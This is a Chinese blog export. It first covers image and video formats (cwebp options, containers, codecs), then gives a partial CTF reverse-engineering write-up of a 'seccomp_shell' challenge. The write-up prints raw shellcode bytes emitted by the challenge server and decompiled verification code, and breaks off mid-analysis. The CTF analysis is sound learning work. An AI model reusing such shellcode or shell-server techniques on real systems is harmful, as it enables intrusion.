<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ cwebp -longhelp</span><br><span class="line">Usage:</span><br><span class="line"> cwebp [-preset &lt;...&gt;] [options] in_file [-o out_file]</span><br><span class="line"></span><br><span class="line">If input size (-s) for an image is not specified, it is</span><br><span class="line">assumed to be a PNG, JPEG, TIFF or WebP file.</span><br><span class="line">Note: Animated PNG and WebP files are not supported.</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  -h / -help ............. short help</span><br><span class="line">  -H / -longhelp ......... long help</span><br><span class="line">  -q &lt;float&gt; ............. quality factor (0:small..100:big), default=75</span><br><span class="line">  -alpha_q &lt;int&gt; ......... transparency-compression quality (0..100),</span><br><span class="line">                           default=100</span><br><span class="line">  -preset &lt;string&gt; ....... preset setting, one of:</span><br><span class="line">                            default, photo, picture,</span><br><span class="line">                            drawing, icon, text</span><br><span class="line">     -preset must come first, as it overwrites other parameters</span><br><span class="line">  -z &lt;int&gt; ............... activates lossless preset with given</span><br><span class="line">                           level in [0:fast, ..., 9:slowest]</span><br><span class="line"></span><br><span class="line">  -m &lt;int&gt; ............... compression method (0=fast, 6=slowest), default=4</span><br><span class="line">  -segments &lt;int&gt; ........ number of segments to use (1..4), default=4</span><br><span class="line">  -size &lt;int&gt; ............ target size (in bytes)</span><br><span class="line">  -psnr &lt;float&gt; .......... target PSNR (in dB. typically: 42)</span><br><span class="line"></span><br><span class="line">  -s &lt;int&gt; &lt;int&gt; ......... input size (width x height) for YUV</span><br><span class="line">  -sns &lt;int&gt; ............. spatial noise shaping (0:off, 100:max), default=50</span><br><span class="line">  -f &lt;int&gt; ............... filter strength (0=off..100), default=60</span><br><span class="line">  -sharpness &lt;int&gt; ....... filter sharpness (0:most .. 7:least sharp), default=0</span><br><span class="line">  -strong ................ use strong filter instead of simple (default)</span><br><span class="line">  -nostrong .............. use simple filter instead of strong</span><br><span class="line">  -sharp_yuv ............. use sharper (and slower) RGB-&gt;YUV conversion</span><br><span class="line">  -partition_limit &lt;int&gt; . limit quality to fit the 512k limit on</span><br><span class="line">                           the first partition (0=no degradation ... 100=full)</span><br><span class="line">  -pass &lt;int&gt; ............ analysis pass number (1..10)</span><br><span class="line">  -qrange &lt;min&gt; &lt;max&gt; .... specifies the permissible quality range</span><br><span class="line">                           (default: 0 100)</span><br><span class="line">  -crop &lt;x&gt; &lt;y&gt; &lt;w&gt; &lt;h&gt; .. crop picture with the given rectangle</span><br><span class="line">  -resize &lt;w&gt; &lt;h&gt; ........ resize picture (*after* any cropping)</span><br><span class="line">  -mt .................... use multi-threading if available</span><br><span class="line">  -low_memory ............ reduce memory usage (slower encoding)</span><br><span class="line">  -map &lt;int&gt; ............. print map of extra info</span><br><span class="line">  -print_psnr ............ prints averaged PSNR distortion</span><br><span class="line">  -print_ssim ............ prints averaged SSIM distortion</span><br><span class="line">  -print_lsim ............ prints local-similarity distortion</span><br><span class="line">  -d &lt;file.pgm&gt; .......... dump the compressed output (PGM file)</span><br><span class="line">  -alpha_method &lt;int&gt; .... transparency-compression method (0..1), default=1</span><br><span class="line">  -alpha_filter &lt;string&gt; . predictive filtering for alpha plane,</span><br><span class="line">                           one of: none, fast (default) or best</span><br><span class="line">  -exact ................. preserve RGB values in transparent area, default=off</span><br><span class="line">  -blend_alpha &lt;hex&gt; ..... blend colors against background color</span><br><span class="line">                           expressed as RGB values written in</span><br><span class="line">                           hexadecimal, e.g. 0xc0e0d0 for red=0xc0</span><br><span class="line">                           green=0xe0 and blue=0xd0</span><br><span class="line">  -noalpha ............... discard any transparency information</span><br><span class="line">  -lossless .............. encode image losslessly, default=off</span><br><span class="line">  -near_lossless &lt;int&gt; ... use near-lossless image preprocessing</span><br><span class="line">                           (0..100=off), default=100</span><br><span class="line">  -hint &lt;string&gt; ......... specify image characteristics hint,</span><br><span class="line">                           one of: photo, picture or graph</span><br><span class="line"></span><br><span class="line">  -metadata &lt;string&gt; ..... comma separated list of metadata to</span><br><span class="line">                           copy from the input to the output if present.</span><br><span class="line">                           Valid values: all, none (default), exif, icc, xmp</span><br><span class="line"></span><br><span class="line">  -short ................. condense printed message</span><br><span class="line">  -quiet ................. don&#x27;t print anything</span><br><span class="line">  -version ............... print version number and exit</span><br><span class="line">  -noasm ................. disable all assembly optimizations</span><br><span class="line">  -v ..................... verbose, e.g. print encoding/decoding times</span><br><span class="line">  -progress .............. report encoding progress</span><br><span class="line"></span><br><span class="line">Experimental Options:</span><br><span class="line">  -jpeg_like ............. roughly match expected JPEG size</span><br><span class="line">  -af .................... auto-adjust filter strength</span><br><span class="line">  -pre &lt;int&gt; ............. pre-processing filter</span><br><span class="line"></span><br><span class="line">Supported input formats:</span><br><span class="line">  WebP, JPEG, PNG, PNM (PGM, PPM, PAM), TIFF</span><br></pre></td></tr></table></figure></div>

</details>

<p>从 PNG 图像创建无损 Webp 图像</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">cwebp -lossless -z 9 -m 6 input.png -o output.webp</span><br><span class="line"><span class="comment"># Saving file &#x27;modem_pc.png.webp&#x27;</span></span><br><span class="line"><span class="comment"># File:      modem_pc.png</span></span><br><span class="line"><span class="comment"># Dimension: 1160 x 747</span></span><br><span class="line"><span class="comment"># Output:    506272 bytes (4.67 bpp)</span></span><br><span class="line"><span class="comment"># Lossless-ARGB compressed size: 506272 bytes</span></span><br><span class="line"><span class="comment">#   * Header size: 5457 bytes, image data size: 500790</span></span><br><span class="line"><span class="comment">#   * Lossless features used: PREDICTION CROSS-COLOR-TRANSFORM SUBTRACT-GREEN</span></span><br><span class="line"><span class="comment">#   * Precision Bits: histogram=5 transform=4 cache=10</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -lossless 无损压缩</span></span><br><span class="line"><span class="comment"># -z 9 最慢编码模式，效果最佳</span></span><br><span class="line"><span class="comment"># -m 6 压缩模式最慢，压缩率最高</span></span><br><span class="line"><span class="comment"># -o 输出文件名</span></span><br></pre></td></tr></table></figure></div>

<p>创建有损压缩 Webp 文件：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">cwebp -m 6 input.png -o output.webp</span><br><span class="line"><span class="comment"># Saving file &#x27;output.webp&#x27;</span></span><br><span class="line"><span class="comment"># File:      input.png</span></span><br><span class="line"><span class="comment"># Dimension: 1160 x 747</span></span><br><span class="line"><span class="comment"># Output:    41678 bytes Y-U-V-All-PSNR 42.63 49.93 49.90   44.01 dB</span></span><br><span class="line"><span class="comment">#            (0.38 bpp)</span></span><br><span class="line"><span class="comment"># block count:  intra4:       1481  (43.17%)</span></span><br><span class="line"><span class="comment">#               intra16:      1950  (56.83%)</span></span><br><span class="line"><span class="comment">#               skipped:      1261  (36.75%)</span></span><br><span class="line"><span class="comment"># bytes used:  header:            271  (0.7%)</span></span><br><span class="line"><span class="comment">#              mode-partition:   6037  (14.5%)</span></span><br><span class="line"><span class="comment">#  Residuals bytes  |segment 1|segment 2|segment 3|segment 4|  total</span></span><br><span class="line"><span class="comment">#     macroblocks:  |       2%|       4%|      29%|      65%|    3431</span></span><br><span class="line"><span class="comment">#       quantizer:  |      36 |      34 |      29 |      23 |</span></span><br><span class="line"><span class="comment">#    filter level:  |      11 |       7 |       5 |      15 |</span></span><br></pre></td></tr></table></figure></div>

<p>命令行工具可能使用不太方便，可以使用在线转化工具。</p>
<h4 id="ImageMagick"><a href="#ImageMagick" class="headerlink" title="ImageMagick"></a>ImageMagick</h4><p><a class="link"   href="https://imagemagick.org/" >ImageMagick <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 是一个开源的命令行图像转化工具，支持的格式非常多，使用也很简单，但对动图的支持性似乎不太好。</p>
<p>使用方式如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">magick input.png output.webp</span><br></pre></td></tr></table></figure></div>

<h2 id="视频"><a href="#视频" class="headerlink" title="视频"></a>视频</h2><p>在现代数字媒体中，编解码器和视频格式 (封装容器) 扮演着至关重要的角色。编解码器 (Codec) 是用于压缩和解压缩数字视频的技术，它决定了视频究竟是以何种方式进行编码存储，从而决定了其质量和大小。而视频格式则是用于存储视频、音频和其他数据的文件格式，如常见的 <code>MP4、AVI、MKV</code> 等。</p>
<p>几十年来，视频编码技术不断迭代，开发人员一直在努力通过更低的<a class="link"   href="https://blog.csdn.net/qq_22833925/article/details/138151822" >码率 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>实现相同的显示质量。这意味着视频文件变得越来越小，从而节省了在线观看视频所需的带宽。节省带宽的原因显而易见：带宽费用较高，视频网站需要缩减成本，这也是无奈之举。</p>
<p>接下来我将从视频格式开始介绍各种常见的视频封装容器，顺便介绍常见的编解码器。最后再介绍硬解软解以及常用的视频处理工具。</p>
<p><strong>注意，笔者考证能力有限，以下内容全凭自身经验 + 简单搜索参考，若读者想进一步研究建议自行寻找更专业的资料。</strong></p>
<h3 id="封装容器"><a href="#封装容器" class="headerlink" title="封装容器"></a>封装容器</h3><p>普通用户一直存在一个常见的误区，那就是以为视频文件的后缀名就是视频的格式，但事实并不是那样的。</p>
<p><strong>一个文件的后缀和这个文件究竟是什么内容，并不是对应关系</strong>，因为后缀属于文件名的一部分，而文件名并不属于文件数据。Windows 系统一直靠后缀名来区分文件，而 Linux 系统是靠文件头的数据标识来区分的。我随便找个标准 <code>.mp4</code> 文件把后缀改了，那么它就不是 MP4 文件了吗？反过来说我随便找个 PDF 文件改成 <code>.docx</code>，难道这个文件就转化成了 Word 文档？显然这是不正确的。</p>
<p>上述例子其实和“视频文件的后缀名不代表视频的格式”想表达的意思有点不一样，对于视频文件来说容器 (格式) 是次要的，编码器才是主要的。分析一个视频文件可以先从后缀简单辨认一下它的类型，然后再进一步查看其编码数据。</p>
<p>容器里包含了视频播放所需要的数据，包括视频流 (Video Stream)、音频流 (Audio Stream)、元数据 (Metadata)，前两个也可以称为XX轨道。当然，有的格式设计时就只支持他们自己那一套编解码方案，这与我上部分所述并不冲突，因为有其他格式可以支持多种编码器。</p>
<ul>
<li><p>MP4</p>
<p> <code>.mp4</code> 几乎是最出名最常用的视频格式了，它属于 <a class="link"   href="https://en.wikipedia.org/wiki/MPEG-4" >MPEG-4 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 标准第 14 部分，但实际上是基于苹果的 QuickTime 格式修改而来。它可以封装 <code>H.264/AVC</code>、<code>H.265/HEVC</code>、<code>VP8/9</code> 等编码格式的视频，而音频编码格式通常为 <code>AAC</code>、<code>Opus</code> 等。</p>
</li>
<li><p>MKV (Matroska Video File)</p>
<p> <code>.mkv</code> 几乎是一种万能的封装格式，因为它的支持性非常好，并且能够封装多个轨道流。常见的使用场景如多语言配音的电影可以封装多音轨，当然也可以多视频轨。</p>
<p> 说到多语言就不得不提到字幕，目前的字幕实现方式无非两种，一种是内嵌字幕，也就是直接把字幕硬编码进视频中成为画面的一部分；另一种是外挂字幕，播放器自己实现一个字幕叠加显示在画面中，用户还可以自己调整字体大小、显示位置等参数，相比内嵌字幕更加灵活。</p>
<p> MKV 也支持<strong>封装字幕流</strong>实现外挂字幕，这样字幕组就不再需要内嵌字幕，相比之下省去了一步。</p>
</li>
<li><p>AVI、RMVB、MOV</p>
<ul>
<li><p>AVI (Audio Video Interleaved) </p>
<p> 该格式也是一种古老的格式，由微软推出，在 DVD 流行的年代非常常见。AVI 格式几乎不进行压缩，所以其编解码较简单，但也由于其不具备压缩功能，视频文件一般较大，不适合网络传输。再加上当今普遍 1080P 清晰度，生成出来的文件就更大了，因此逐渐淡出历史舞台，可能有一些摄像设备会使用这种格式来保存视频。</p>
<p> 该格式还有一个最大的问题是，它的编码压缩标准不统一，导致播放时经常出现问题。我依稀记得我的索尼数码相机录制格式就是 AVI，但是文件拿到 Windows Media Player 上播放时整个视频会快速一闪而过，除此之外可能还存在无法拖进度条、音画不同步等问题。</p>
</li>
<li><p>RMVB</p>
<p> <code>.rmvb</code> 是一种视频文件格式，其中的 VB 指 Variable Bit Rate (可变比特率)。该格式风靡于 BT 流行的早期年代，由于它支持可变码率，所以能够将文件体积减小，在当年网速较慢的时代很多人选择将电影视频压制为该格式来传播。</p>
</li>
<li><p>MOV (QuickTime)</p>
<p> <code>.mov</code> 即 QuickTime 格式，由苹果公司开发，剪辑行业应该对这个格式不陌生。它可以提供极佳的画质和音质效果，故常用于电影行业，但由于其体积庞大，在网络上很少使用。</p>
<p> 注意，MOV 之所以体积庞大，是因为该格式经常被用于高清晰度剪辑，所有软件导出为 MOV 格式时都会默认将码率设置得几乎无损，并且苹果自己开发的一些编解码器本身就是高码率类型。该格式也支持 H.264，笔者亲自使用 Adobe Media Encoder 测试导出，其码率不可调整，直接就是 1080P 均码 10M，这也印证了本小节开头提到的，编码器才是决定视频质量的主要因素，容器是次要的。</p>
<p> 为了让读者直观感受一下 MOV 格式到底有多大，我使用 Ae 导出了一个 4 分 04 秒的 1080P 视频，使用 Apple Pro Res 422 编码器，视频码率达到了惊人的 132 Mbps，整个文件体积为 3.7 GB。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://testingcf.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/skills_img/mov_example.png.avif"
                      alt="MOV example"
                ></p>
</li>
</ul>
</li>
<li><p>FLV (Flash Video)</p>
<p> 一种网络流媒体专用格式，曾经被 B 站、优酷、爱奇艺等众多网站所使用。它之所以叫 Flash Video，是因为它是依赖 Flash (没错就是当年那个 Flash 插件，现在已经退出历史舞台) 的一种格式。</p>
<p> 当年 Flash 是一项热门技术，想要在网页上实现精美的播放器控件，Flash 无疑是最好的选择。<code>.swf</code> 是 Flash 的动画格式，而若是将视频直接导入 <code>.swf</code>，体积又过于庞大，于是 <code>.flv</code> 应运而生。但是 Flash 技术被人批判已久，因为它存在非常多的安全漏洞，Adobe 修洞修得不想修了宣布要停止支持 Flash。后来 Google 直接把 Chrome 和 Flash 切割了不让用了，于是各大网站都开始“转型”，FLV 也就逐渐淡出历史舞台。</p>
</li>
<li><p>待补充更多格式</p>
</li>
</ul>
<h3 id="视频编解码器"><a href="#视频编解码器" class="headerlink" title="视频编解码器"></a>视频编解码器</h3><h4 id="H-264-x2F-AVC"><a href="#H-264-x2F-AVC" class="headerlink" title="H.264&#x2F;AVC"></a>H.264&#x2F;AVC</h4><p>H.264 编码器是 MPEG-4 标准的第 10 部分，称为 <code>Advanced Video Coding (H.264 / AVC / MPEG-4 AVC / MPEG-4 part 10)</code>，首发于 2004 年。</p>
<p>在当今这个时代 H.264 已经算是视频编码器的最低标准了，它的压缩率中规中矩，几乎被所有视频硬件设备所支持，正因如此 H.264 可以称为是兼容性最高的一种编码器。20 多年以来，虽然不断有新的编码器问世，但 H.264 仍旧在被大量使用，笔者猜测原因可能有如下几点：</p>
<ol>
<li><p>无可挑剔的兼容性</p>
<p>从软件层看，几乎所有浏览器&#x2F;播放器&#x2F;应用程序都支持解析 H.264 格式的视频，这很大程度是因为多年前，苹果公司毅然决然抛弃了 Adobe 的 VP6 编码，选择了 H.264，这一标准随着数亿台苹果设备走进了千家万户，其他厂商也随着苹果的脚步跟进，最终 H.264 才有了现在庞大的市场份额；上面也提到，几乎任何设备都支持 H.264 硬解 (什么是硬解软解，后面再介绍)，就算不能硬解，软解的算力也完全够用，因为其解码开销很少。</p>
</li>
<li><p>编码开销相对较少</p>
<p>H.264 标准制定已有 20 余年，这期间又诞生了各种各样的编码器，压缩效果比 H.264 强。但是强大的压缩效果是更加复杂的压缩算法换来的，这样做的结果就是编码开销普遍比 H.264 高出数倍。H.264 可能 5 分钟编码完一个视频，而其他编码器可能要花费 15 分钟甚至更多时间来编码，并且 CPU&#x2F;GPU 占用还比 H.264 高出不少，这一点无论是对于个人还是企业都是一个问题，算力始终是有限的，算力不够就只能花钱来凑。</p>
<p>需要接触视频编码的群体一般是：</p>
<ol>
<li><p>视频网站&#x2F;IM&#x2F;社交媒体平台：二压用户上传的视频，并为观众提供多种清晰度选择，并且保证最大兼容性。</p>
</li>
<li><p>个人视频制作者：可能以多种媒介发布视频，自己压制视频以获得最佳效果。以前 B 站曾有过 UP 主自己压制到一定码率以下就能防止被二压的操作，可见个人创作者掌握这些技能非常有用。</p>
</li>
<li><p>字幕组：10 年前左右是字幕组的黄金时代，那时候 H.265 还没有开始推广，各路大神把 H.264 研究了个透，只求在合适的清晰度下实现最佳的压制效果。</p>
</li>
<li><p>摄影设备：如手机，其算力有限，实时编码使用 H.264 开销最低，兼容性最好，并且能提供一定程度的压缩。虽然 H.265 的开销也足以支持实时编码，但 H.265 的兼容性极差，一直到最近几年才慢慢普及。</p>
</li>
</ol>
</li>
<li><p>缺少替代产品</p>
<p>其实现在市面上能使用的编码器就那么几个，和 H.264 性能接近的，都被它所替代；性能优于 H.264 的，硬件需求又太高。那么和 H.264 解码开销接近但压缩比更高的 H.265 使用率为什么也迟迟没有上去呢？其实主要原因是 H.265 的高昂专利费把自己玩死了，读者可以自行了解。</p>
</li>
</ol>
<h4 id="H-265-x2F-HEVC"><a href="#H-265-x2F-HEVC" class="headerlink" title="H.265&#x2F;HEVC"></a>H.265&#x2F;HEVC</h4><p>High Efficiency Video Coding (HEVC) 是 H.264&#x2F;AVC 编解码器的继任者。随着光纤的发明，互联网进入高速时代，视频清晰度由 4K 上限提升到了 8K。</p>
<p>H.264 的最高分辨率为 4K，为了解决这个问题，HEVC 应运而生。HEVC 最高支持的清晰度为 8K，并且它能在与 H.264 画质相同的情况下，将码率减少 50%，如此优越的性能也是更加复杂的算法实现的，所以 HEVC 的编解码开销都大于 H.264，对硬件的要求更高了。</p>
<p>HEVC 有着如此优秀的性能，为什么从 2013 年发布至今也未能达到 H.264 的高度呢？这个问题其实很有意思，让我们来详细探讨一下。想了解更多也可以看这篇文章：<a class="link"   href="https://juejin.cn/post/7158700639030247460" >【专访】 Chrome HEVC 硬解背后的字节开源贡献者 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<ol>
<li>HEVC 专利问题错综复杂</li>
</ol>
<p>据说 HEVC 的专利费非常高，并且涉及到多方势力，还闹出过许多问题，总之这也是 HEVC 推广度低的一大原因。HEVC 的专利问题非常复杂，我觉得营养价值不大没必要写太多。</p>
<ol start="2">
<li>Chrome 曾迟迟不支持 HEVC 硬解</li>
</ol>
<p>在 2022 年以前，Chrome 浏览器是不支持 HEVC 硬解的，当时支持 HEVC 硬解的几乎只有苹果的 Safari 浏览器，但是论市场份额，Safari 绝对比不过 Chrome。</p>
<p>Chrome 迟迟不支持硬解导致了无数使用 Chrome 的设备一直无法播放 HEVC 格式的视频，网站为了兼容性肯定是不会考虑将 HEVC 大范围作为 Web 流媒体格式的，在 Web 这块大饼中，HEVC 甚至败给了落后的 H.264。</p>
<p>那么 Chrome 为什么迟迟不支持 HEVC 硬解呢？这个问题其实没有一个确切的结论，我们知道 Chrome 使用的是 Google 开源的浏览器内核 Chromium，而 Google 其实有自己的编码器 VP8&#x2F;9，并且此前他们一直在 YouTube 上使用这一套编码器。据上面链接文章中所说，Google 在 HEVC 专利问题上没有占据到有利地位，所以可能是想推广自己的 VP9 编码器来“对抗” HEVC，毕竟 VP9 能提供与 HEVC 接近的性能，并且开源免费。</p>
<ol start="3">
<li>转码成本</li>
</ol>
<p>一旦视频网站选择了使用 HEVC，就必须从原格式进行迁移，这意味着他们需要对原库存视频进行转码。转码其实不是一件很难的事，但如果涉及到大规模转码，就很麻烦。对于一个视频网站，存储成本、带宽成本、编码 (计算) 成本这三样中，带宽成本占的才是大头，当选择迁移到 HEVC 后，总成本理应会降低。但是在转码这个过程中，时间成本和编码成本将会非常高，如果不是大厂商几乎搞不了，就算是大厂商，也需要进行详细的规划后才能启动。或者就直接不管库存内容，直接从新内容开始启用 HEVC，也不失为一种解决方法。</p>
<ol start="4">
<li>更优的编解码器已经出现</li>
</ol>
<p>HEVC 虽然迟迟没有推广开，但是技术发展不可能停下脚步，更优越的编解码器已经出现，他们就是 AV1 与 H.266&#x2F;VVC。</p>
<p>VVC 到目前为止似乎还没有正式发布，并且由于它的前辈 HEVC 的事迹，各家心里都对它有数。于是 Google 主导了开源项目 <a class="link"   href="https://aomedia.googlesource.com/aom/" >libaom <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，即 AV1 编解码器，目的就是要防止 VVC 再一次垄断行业。</p>
<p>现在 av1 已经正式投入使用，B 站目前已经将所有视频强制使用 av1 编码器无法更改，YouTube 也已经将普通视频全部使用 av1 编码，高码率 4&#x2F;8K 视频依旧使用 VP9。所以现在实际上已经进入了下一个时代，AV1 与 VVC 竞争的时代，而 HEVC 也注定不可能再有更多起色。</p>
<h4 id="AV1"><a href="#AV1" class="headerlink" title="AV1"></a>AV1</h4><p><strong>以下内容部分摘自 <a class="link"   href="https://zh.wikipedia.org/wiki/AOMedia_Video_1" >Wikipedia <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></strong></p>
<p>AOMedia Video 1 (AV1) 是一个开放、免专利的影片编码格式，为网络流传输而设计。它由开放媒体联盟 (AOMedia) 开发，目标是取代其前身 VP9。</p>
<p>创建 AV1 主要是因为 HEVC 的专利许可成本高昂，授权空间模糊，业界对此积怨已久。AOM 联盟最初由七间公司，Amazon、Cisco、Google、Intel、Microsoft、Mozilla 和 Netflix 所组成，并宣布技术重点为提供高质量<strong>网络</strong>影像。到目前为止 (2024.10)，AV1 已经在多家平台上正式投入使用，包括 Netflix、YouTube、Bilibili 等大型视频平台。</p>
<p>AV1 专门为网络流媒体而设计，它在低码率下的压缩率表现得非常好。由于 AV1 是开源的，所以存在衍生版本，目前常用的 AV1 编码器有三种，分别为 libaom-av1、librav1e、libsvtav1。</p>
<ul>
<li><p><a class="link"   href="https://aomedia.googlesource.com/aom/" >libaom-av1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br> 该编码器是一个参考库，它是 AV1 的示例版本，编码速度非常慢，在生产环境中基本不会考虑使用该编码器。</p>
</li>
<li><p><a class="link"   href="https://github.com/xiph/rav1e" >librav1e <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br> 第二慢的编码器，效果未知，大约和 libaom-av1 质量相当。</p>
</li>
<li><p><a class="link"   href="https://gitlab.com/AOMediaCodec/SVT-AV1/" >libsvtav1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br> Netflix 主导开发的编码器，编码速度最快，但是快也意味着压缩率不高。</p>
</li>
</ul>
<p>上面提到过的 AVIF 图像使用的正是 AV1 编码器，这使得该图像格式可以做到比相同质量 JPEG 图像体积小 60% 左右，本博客已经将图片全面替换为该格式。</p>
<p>需要注意的是，AV1 的理论效果虽然强于 HEVC，但是它为了规避专利问题做了很多妥协，在速度比 HEVC 慢几倍的同时甚至不一定能做到更低的码率，相比 H.266&#x2F;VVC 也不一定能做到更好的效果，AV1 的最大问题始终还是速度太慢。在后续介绍工具 FFMpeg 时，我将会进行编码测试，对各个编码器进行对比评测。</p>
<h2 id="持续更新中-10-23"><a href="#持续更新中-10-23" class="headerlink" title="持续更新中(10.23)"></a>持续更新中(10.23)</h2>]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Windows</tag>
        <tag>CTF</tag>
        <tag>Misc</tag>
      </tags>
  </entry>
  <entry>
    <title>Hitcon 2023 Blade WP</title>
    <url>/2023/09/10/hitcon-2023-blade-wp/</url>
    <content><![CDATA[<p>不太会，只做了这一道</p>
<h3 id="表面行为分析"><a href="#表面行为分析" class="headerlink" title="表面行为分析"></a>表面行为分析</h3><p>首先运行程序，会进入一个交互界面，然后提示可以进入 server 模式，并且 <code>run</code> 之后打印出来一串 opcode</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://testingcf.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/blade_run.jpg.avif"
                     
                ></p>
<p>nc 连 server，server 提示连接成功，<code>help</code> 查看指令</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://testingcf.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/blade_server_help.jpg.avif"
                     
                ></p>
<p>随后尝试运行这些指令，server 这边直接卡住了，但是 nc 这边出现了乱码</p>
<p>如图是运行 pwd 出现的乱码：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://testingcf.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/blade_pwd.jpg.avif"
                     
                ></p>
<p>由于看不出来是什么，所以上 pwntools 提一下数据得到</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">b&#x27;T]1\xf6\x81\xc6\x00\x10\x00\x00H)\xf4T_jOX\x0f\x05PH\x92H\x83\xc2\x08S_T^j\x01X\x0f\x05U\\A\xff\xe7&#x27;</span></span><br></pre></td></tr></table></figure></div>

<p>有点抽象，难道是 <code>pwd</code> 执行结果加密后的数据表现吗？那么 flag 有可能和这个是同一套加密，那么也许可以先找到这套加密代码，再看看程序中有无藏匿的 flag 加密后数据，从而得到原 flag。但是这个猜想不一定对，我又尝试执行了 <code>ls</code> ，得到的数据和上面的差不多，而且比较短，感觉文件名加密后不可能才这么点长。于是我将其复制到 IDA 里 c 一下，发现这玩意儿是 opcode，疑似是实现其列出的操作的代码，但是这样打印出来不知道干嘛的。</p>
<p>到这里程序表象已经看不出来什么了，接下来是逆向环节</p>
<h3 id="程序逆向分析"><a href="#程序逆向分析" class="headerlink" title="程序逆向分析"></a>程序逆向分析</h3><p>IDA 打开能直接找到 <code>main</code> 函数 <code>seccomp_shell::main::hef7e76ec97275895()</code></p>
<p><code>main</code> 函数中直接能找到关键函数 <code>seccomp_shell::cli::prompt::h56d4b6fe2f13f522(&amp;v5)</code></p>
<p>由函数名可以推断，这个函数负责处理 cli 界面与指令，有可能是通过类似 <code>switch</code> 的方式来处理指令</p>
<p>根据经验，这种处理 cli 的函数前面可能会根据终端的环境变量来设置或打印一些初始化内容，所以前面的代码大概率没用，往后翻看看有无 <code>switch</code></p>
<p>事实证明也确实有：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://testingcf.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/blade_func_shell.jpg.avif"
                     
                ></p>
<p>上图这种 <code>switch</code> 字符串的比较方式不知道是 Rust 编译器干的还是出题人故意这样写的，总之我看着值有点像 ascii 范围就 R 了一下，结果确实是字符。应该是根据用户输入进入相应的函数，那么进 <code>seccomp_shell::shell::prompt::h76cecfe7bd3bdf50(v33)</code> 看看吧</p>
<p>然后就发现了刚刚打印出来的字符串，看来 server 之后进入的交互就是这个函数负责的：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://testingcf.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/blade_fun_shell_p.jpg.avif"
                     
                ></p>
<p>然后继续往下看，发现了爆点</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://testingcf.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/blade_func_shell_flag.jpg.avif"
                     
                ></p>
<p>上图中出现了 <code>flag</code> 命令，我随即启动程序测试</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://testingcf.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/blade_input_flag.jpg.avif"
                     
                ></p>
<p>如图直接输 <code>flag</code> 会提示 Incorrect ，随后我在后面加参数运行也不会有报错，猜测就是把 <code>flag</code> 后面的参数拿去验证了。先进 <code>seccomp_shell::shell::verify::h898bf5fa26dafbab(v154, v175[3], v175[5])</code> 函数看看</p>
<p>verify有点长就不截图了，挑几个部分说一下</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">memcpy</span>(dest, &amp;unk_55DF6DF58920, <span class="number">0x200</span>uLL);</span><br><span class="line"> v52 = <span class="number">64LL</span>;</span><br><span class="line"> v53 = &amp;dest[<span class="number">1</span>];</span><br><span class="line"> <span class="keyword">do</span></span><br><span class="line"> &#123;</span><br><span class="line">   v54 = *(v53 - <span class="number">1</span>);</span><br><span class="line">   <span class="keyword">if</span> ( v54 &gt; <span class="number">0x3F</span> )</span><br><span class="line">     <span class="keyword">goto</span> LABEL_53;</span><br><span class="line">   v55 = tmp_addr[v52 - <span class="number">1</span>];</span><br><span class="line">   tmp_addr[v52 - <span class="number">1</span>] = tmp_addr[v54];</span><br><span class="line">   tmp_addr[v54] = v55;</span><br><span class="line">   v56 = *v53;</span><br><span class="line">   <span class="keyword">if</span> ( *v53 &gt; <span class="number">0x3F</span> )</span><br><span class="line">     <span class="keyword">goto</span> LABEL_53;</span><br><span class="line">   v57 = tmp_addr[v52 - <span class="number">2</span>];</span><br><span class="line">   tmp_addr[v52 - <span class="number">2</span>] = tmp_addr[v56];</span><br><span class="line">   tmp_addr[v56] = v57;</span><br><span class="line">   v53 += <span class="number">2</span>;</span><br><span class="line">   v52 -= <span class="number">2LL</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">while</span> ( v52 );</span><br></pre></td></tr></table></figure></div>

